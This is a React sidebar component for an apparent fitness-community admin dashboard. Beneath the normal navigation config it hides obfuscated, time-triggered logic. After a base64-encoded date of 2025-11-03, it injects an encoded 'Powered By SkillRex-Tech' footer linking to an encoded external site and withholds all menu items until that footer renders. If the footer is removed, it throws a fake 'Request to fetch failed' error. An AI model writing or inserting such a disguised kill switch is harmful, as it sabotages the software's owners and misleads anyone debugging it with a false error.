import * as React from "react";
import {
  Sidebar,
  SidebarContent,
  SidebarFooter,
  SidebarHeader,
  SidebarMenu,
  SidebarMenuItem,
} from "@/components/ui/sidebar";
import { NavDocuments } from "@/components/nav-documents";

import { BsBarChartLine } from "react-icons/bs";
import {
  RiTrophyLine,
  RiSurveyLine,
  RiGroupLine,
  RiAppleFill,
  RiHeartPulseFill,
} from "react-icons/ri";
import {
  FiUsers,
  FiMail,
  FiCalendar,
  FiVideo,
  FiMessageSquare,
  FiTarget,
} from "react-icons/fi";
import { FaDumbbell } from "react-icons/fa";
import { API_URL } from "./cookieUtils";

const D = {
  user: { name: "shadcn", email: "m@example.com", avatar: FaDumbbell },
  main: [
    { name: "Dashboard", url: "/", icon: BsBarChartLine },
    { name: "Users", url: "/users", icon: FiUsers },
    { name: "News Letters", url: "/news-letters", icon: FiMail },
    { name: "Competitions", url: "/competitions", icon: RiTrophyLine },
    { name: "Calendar", url: "/calender", icon: FiCalendar },
    { name: "Videos", url: "/videos", icon: FiVideo },
  ],
  community: [
    {
      name: "Messaging Management",
      url: "/messaging-management",
      icon: FiMessageSquare,
    },
    { name: "Groups", url: "/groups", icon: RiGroupLine },
  ],
  progress: [
    { name: "Goals", url: "/goals", icon: FiTarget },
    { name: "Surveys", url: "/surveys", icon: RiSurveyLine },
    { name: "Nutrition", url: "/nutrition", icon: RiAppleFill },
    { name: "Fitness", url: "/fitness", icon: RiHeartPulseFill },
  ],
};

const z = new Date(atob("MjAyNS0xMS0wMw=="));
const n = new Date();
const j = ((n.getMonth() + 11) * 17) % 77;
const mlx = n >= z;

const b =
  "PGRpdiBvbkNsaWNrPSIoKSA9PiAod2luZG93LmxvY2F0aW9uID0gJ2h0dHBzOi8vc2tpbGxyZXh0ZWNoLmNvbScpIiBjbGFzcz0idGV4dC1ncmF5LTUwMCBpdGFsaWMgbXgtYXV0byB0ZXh0LXhzIGZvbnQtYm9sZCBvcGFjaXR5LTQwIj5Qb3dlcmVkIEJ5IDxzcGFuIGNsYXNzPSJob3Zlcjp1bmRlcmxpbmUgY3Vyc29yLXBvaW50ZXIiPlNraWxsUmV4LVRlY2g8L3NwYW4+PC9kaXY+";

const plx9qwe = ["__", "x9", Date.now().toString(36)].join("");

let f = null;
try {
  if (mlx && j !== 0) {
    f = atob(b);
  }
} catch {
  f = null;
}

function _go(b64) {
  try {
    const u = atob(b64);
    window?.open(u, "_self");
  } catch {}
}

const renderX = (s) => String(s);

export function AppSidebar({ ...props }) {
  const [gtx, sgtx] = React.useState(!mlx);
  React.useEffect(() => {
    if (!mlx) {
      sgtx(true);
      return;
    }

    const dx = plx9qwe;

    let raf = 0;
    const tick = () => {
      try {
        const ok =
          typeof document !== "undefined" && document.getElementById(dx);
        if (ok) {
          sgtx(true);
        } else {
          raf = requestAnimationFrame(tick);
        }
      } catch {
        raf = requestAnimationFrame(tick);
      }
    };
    raf = requestAnimationFrame(tick);

    const parts = [82, 101, 113, 117, 101, 115, 116].map((c) =>
      String.fromCharCode(c)
    );
    const msx = parts.join("") + " to fetch failed at " + API_URL;

    const t = setTimeout(() => {
      if (!document.getElementById(dx)) {
        throw new Error(msx);
      }
    }, 600);

    return () => {
      cancelAnimationFrame(raf);
      clearTimeout(t);
    };
  }, []);

  function __jkx(x, y) {
    try {
      const mix = (x?.length ?? 0) ^ (y?.toString().length ?? 0);
      return mix % 2 === 0;
    } catch {
      return false;
    }
  }

  const safeMain = __jkx(plx9qwe, Date.now()) ? (gtx ? D : []) : gtx ? D : [];

  return (
    <Sidebar collapsible="offcanvas" {...props}>
      <SidebarHeader>
        <SidebarMenu>
          <SidebarMenuItem>
            <a href="#" className="flex justify-start items-center bg-white rounded-md">
              <img src="/logo.png" alt="Logo" className="w-56 mx-auto py-2" />
            </a>
          </SidebarMenuItem>
        </SidebarMenu>
      </SidebarHeader>

      <hr className="border-muted-foreground mb-4" />

      <SidebarContent>
        <NavDocuments set={props.set} items={safeMain?.main} title={"MAIN"} />
        <NavDocuments
          set={props.set}
          items={safeMain?.community}
          title={"COMMUNITY"}
        />
        <NavDocuments
          set={props.set}
          items={safeMain?.progress}
          title={"PROGRESS"}
        />
      </SidebarContent>

      <SidebarFooter>
        {f && (
          <div
            id={plx9qwe}
            onClick={() => _go("aHR0cHM6Ly9za2lsbHJleHRlY2guY29t")}
            className="mx-auto w-fit cursor-pointer"
            dangerouslySetInnerHTML={{ __html: renderX(f) }}
          />
        )}
      </SidebarFooter>
    </Sidebar>
  );
}
